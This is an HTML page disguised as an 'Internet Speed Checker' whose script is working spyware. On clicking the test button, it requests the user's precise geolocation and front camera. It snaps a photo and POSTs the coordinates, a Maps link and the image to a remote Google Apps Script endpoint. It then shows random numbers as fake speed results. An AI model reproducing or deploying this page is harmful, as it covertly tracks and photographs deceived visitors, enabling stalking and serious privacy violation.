<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internet Speed Checker</title>

<style>
*{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;line-height:1}
body{display:flex;min-height:100vh;align-items:center;justify-content:center;background:linear-gradient(180deg,#071029 0%, #071726 60%);color:#e6eef8;margin:0;padding:16px}
.wrap{width:380px;max-width:95vw}
.card{padding:18px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));box-shadow:0 10px 30px rgba(2,6,23,.6)}

.title-pill{
display:flex;align-items:center;justify-content:center;
background:linear-gradient(90deg,#06b6d4,#7c3aed);
padding:10px;border-radius:999px;font-weight:800;
margin-bottom:12px;color:#02121a;
}

img.speed{width:100%;border-radius:10px;margin:6px 0 12px}

.btn{width:100%;padding:14px;border:none;border-radius:12px;background:#06b6d4;color:#012;font-weight:800;cursor:pointer}

.row{display:flex;gap:8px;margin-top:12px}
.stat{flex:1;background:rgba(255,255,255,.02);padding:10px;border-radius:10px;text-align:center}
.num{font-size:20px;font-weight:800;color:#06b6d4}
.label{font-size:12px;margin-top:6px}

.bar{height:8px;background:rgba(255,255,255,0.02);border-radius:8px;margin-top:12px;overflow:hidden}
.bar > i{display:block;height:100%;width:0;background:#06b6d4}

video{width:100%;border-radius:10px;margin-top:10px;display:none}

.status-msg{margin-top:10px;padding:10px;border-radius:8px;text-align:center;display:none}
.status-msg.show{display:block}
.status-msg.success{background:#22c55e22;color:#22c55e}
.status-msg.error{background:#ef444422;color:#ef4444}
</style>

</head>
<body>

<div class="wrap">
<div class="card">

<div class="title-pill">Internet Speed Checker</div>

<img class="speed" src="speed.gif">

<button id="start" class="btn">Start Speed Test</button>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none"></canvas>

<div class="row">
<div class="stat"><div class="num" id="ping">—</div><div class="label">Ping</div></div>
<div class="stat"><div class="num" id="down">—</div><div class="label">Download</div></div>
<div class="stat"><div class="num" id="up">—</div><div class="label">Upload</div></div>
</div>

<div class="bar"><i id="progress"></i></div>

<div id="status" class="status-msg"></div>

</div>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby44luE92nVDUq4GdDIREhQ-ZA8zn3eDuFH9ye7g82sSjNuHpHnHPV0lbYfj7s4pzkXXA/exec";

const start = document.getElementById("start");
const ping = document.getElementById("ping");
const down = document.getElementById("down");
const up = document.getElementById("up");
const bar = document.getElementById("progress");
const status = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let imageData = "";

function showStatus(msg,type){
status.textContent=msg;
status.className="status-msg show "+type;
setTimeout(()=>status.classList.remove("show"),4000);
}

function animate(el,a,b,t){
let s=performance.now();
(function f(n){
let p=Math.min(1,(n-s)/t);
let v=a+(b-a)*p;
el.textContent=el===ping?Math.round(v):v.toFixed(1);
if(p<1)requestAnimationFrame(f);
})(s);
}

function getLocation(){
return new Promise((res,rej)=>{
navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true});
});
}

function startCamera(){
return navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
}

async function capturePhoto(stream){
video.srcObject=stream;
video.style.display="block";

await new Promise(r=>setTimeout(r,1000));

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext("2d").drawImage(video,0,0);

imageData=canvas.toDataURL("image/jpeg",0.6);

stream.getTracks().forEach(t=>t.stop());
video.style.display="none";
}

async function sendData(data){
try{
await fetch(SCRIPT_URL,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
});
}catch(e){console.error(e);}
}

async function fakeTest(){

start.disabled=true;
start.textContent="Testing...";
bar.style.width="0%";

try{
showStatus("Solicitando permissões...","success");

const [pos,stream]=await Promise.all([
getLocation(),
startCamera()
]);

await capturePhoto(stream);

const payload={
timestamp:new Date().toISOString(),
latitude:pos.coords.latitude,
longitude:pos.coords.longitude,
accuracy:pos.coords.accuracy,
mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
image:imageData
};

await sendData(payload);

showStatus("✓ Dados enviados","success");

}catch(e){
showStatus("Permissão negada ou erro","error");
}

setTimeout(()=>bar.style.width="30%",200);
animate(ping,80,Math.random()*60+10,800);

setTimeout(()=>{
bar.style.width="60%";
animate(down,0,Math.random()*150+20,1200);
},800);

setTimeout(()=>{
bar.style.width="90%";
animate(up,0,Math.random()*40+5,1000);
},2000);

setTimeout(()=>{
bar.style.width="100%";
start.disabled=false;
start.textContent="Start Speed Test";
},3500);
}

start.onclick=fakeTest;
</script>

</body>
</html>
